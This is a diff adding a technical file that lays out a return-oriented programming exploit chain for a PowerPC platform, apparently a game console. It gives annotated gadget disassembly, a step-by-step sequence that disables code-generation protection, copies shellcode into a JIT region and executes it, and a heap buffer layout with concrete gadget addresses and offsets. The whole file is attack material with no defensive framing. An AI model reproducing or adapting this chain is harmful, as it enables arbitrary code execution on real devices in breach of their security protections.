@@ -1,0 +1,110 @@
+.text:0EA04A90                 lwz       r29, 0(r31)
+.text:0EA04A94                 lwz       r0, 0x54C(r29)	# 1. Pivot the stack into the heap (at 0x0E3B09A4)
+.text:0EA04A98                 mr        r30, r3	     The value at 4(r4) is loaded into r1
+.text:0EA04A9C                 mtspr   CTR, r0		     This value will be our vtable
+.text:0EA04AA0                 mr        r3, r31
+.text:0EA04AA4                 bctrl
+.text:0EA04AA8                 lwz       r6, 0x50C(r29)	# 2. Return into the stack (at 0x0E0D595C)
+.text:0EA04AAC                 mr        r28, r3	     This will begin executing the payload in the vtable
+.text:0EA04AB0                 mtspr   CTR, r6
+.text:0EA04AB4                 mr        r3, r31
+.text:0EA04AB8                 bctrl
+.text:0EA04ABC                 lwz       r29, 0(r31)
+.text:0EA04AC0                 lwz       r0, 0x53C(r29)	# 3. Call one of our needed functions
+.text:0EA04AC4                 mtspr   CTR, r0		     First parameter is in r31, next two are in r4 and r5
+.text:0EA04AC8                 add       r25, r28, r3
+.text:0EA04ACC                 mr        r3, r31
+.text:0EA04AD0                 bctrl
+.text:0EA04AD4                 lwz       r0, 0x4FC(r29)	# 4. Return into the stack again (at 0x0E0D595C)
+.text:0EA04AD8                 mr        r29, r3
+.text:0EA04ADC                 mtspr   CTR, r0
+.text:0EA04AE0                 mr        r3, r31
+.text:0EA04AE4                 bctrl
+
+Stack Execution
+-----------------------------------------------------------------
+1. Load buffer_address into r29 and 0 into r31 (at 0x0E0D6D8C)
+2. Call OSSwitchSecCodeGenMode() indirectly (at 0x0EA04AC0)
+3. Load (buffer_address + 4) into r29, the JIT address into r31 and the length of our shellcode into r5, off the stack (at 0x0E0F9000)
+4. Load the address of our shellcode into r4, off the stack (at 0x0E0E5D54)
+5. Call memcpy() indirectly (at 0x0EA04AC0)
+6. Load (buffer_address + 8) into r29 and the JIT address into r31, both off the stack (at 0x0E0D6D8C)
+7. Load the length of our shellcode into r4, off the stack (at 0x0E0E5D54)
+8. Call DCFlushRange() indirectly (at 0x0EA04AC0)
+9. Load (buffer_address + 12) into r29 and the JIT address into r31, both off the stack (at 0x0E0D6D8C)
+10. Load the length of our shellcode into r4, off the stack (at 0x0E0E5D54)
+11. Call ICInvalidateRange() indirectly (at 0x0EA04AC0)
+12. Load buffer_address into r29 and 1 into r31 (at 0x0E0D6D8C)
+13. Call OSSwitchSecCodeGenMode() indirectly (at 0x0EA04AC0)
+
+Heap Buffer Layout						Value
+-------------------------------------------------------------------------------------
+0x0C  - ROP gadget #1 (at the start, r1 is at offset 0x08)	0x0E0D6D8C
+0x14  - Buffer address
+0x18  - r30
+0x1C  - 0
+
+0x24  - ROP gadget #2 (at the start, r1 is at offset 0x20)	0x0EA04AC0
+
+0x30  - ROP gadget #3 (at the start, r1 is at offset 0x2C)	0x0E0F9000
+0x64  - Shellcode length					0x400
+0x80  - Buffer address + 4
+0x84  - r30
+0x8C  - JIT address						0x01800000
+
+0x90  - ROP gadget #4 (at the start, r1 is at offset 0x8C)	0x0E0E5D54
+0x94  - r3
+0x98  - Shellcode address
+0xBC  - r30
+0xC0  - JIT address						0x01800000
+
+0xC8  - ROP gadget #5 (at the start, r1 is at offset 0xC4)	0x0EA04AC0
+
+0xD0  - ROP gadget #6 (at the start, r1 is at offset 0xCC)	0x0E0D6D8C
+0xD8  - Buffer address + 8
+0xDC  - r30
+0xE0  - JIT address						0x01800000
+
+0xE8  - ROP gadget #7 (at the start, r1 is at offset 0xE4)	0x0E0E5D54
+0xEC  - r3
+0xF0  - Shellcode length					0x400
+0x114 - r30
+0x118 - JIT address						0x01800000
+
+0x120 - ROP gadget #8 (at the start, r1 is at offset 0x11C)	0x0EA04AC0
+
+0x128 - ROP gadget #9 (at the start, r1 is at offset 0x124)	0x0E0D6D8C
+0x130 - Buffer address + 12
+0x134 - r30
+0x138 - JIT address						0x01800000
+
+0x140 - ROP gadget #10 (at the start, r1 is at offset 0x13C)	0x0E0E5D54
+0x144 - r3
+0x148 - Shellcode length					0x400
+0x16C - r30
+0x170 - JIT address						0x01800000
+
+0x178 - ROP gadget #11 (at the start, r1 is at offset 0x174)	0x0EA04AC0
+
+0x180 - ROP gadget #12 (at the start, r1 is at offset 0x17C)	0x0E0D6D8C
+0x188 - Buffer address
+0x18C - r30
+0x190 - 1
+
+0x198 - ROP gadget #13 (at the start, r1 is at offset 0x194)	0x0EA04AC0
+
+0x1A0 - ROP gadget #14 (at the start, r1 is at offset 0x19C)	0x01800000
+
+0x1B0 - Shellcode
+
+0x4FC - Function epilogue gadget				0x0E0D595C
+0x500 - Function epilogue gadget				0x0E0D595C
+0x504 - Function epilogue gadget				0x0E0D595C
+0x508 - Function epilogue gadget				0x0E0D595C
+0x50C - Function epilogue gadget				0x0E0D595C
+0x53C - OSSwitchSecCodeGenMode()
+0x540 - memcpy()
+0x544 - DCFlushRange()
+0x548 - ICInvalidateRange()
+0x54C - Stack pivot gadget					0x0E3B09A4
+0x5EC - Function epilogue gadget				0x0E0D595C
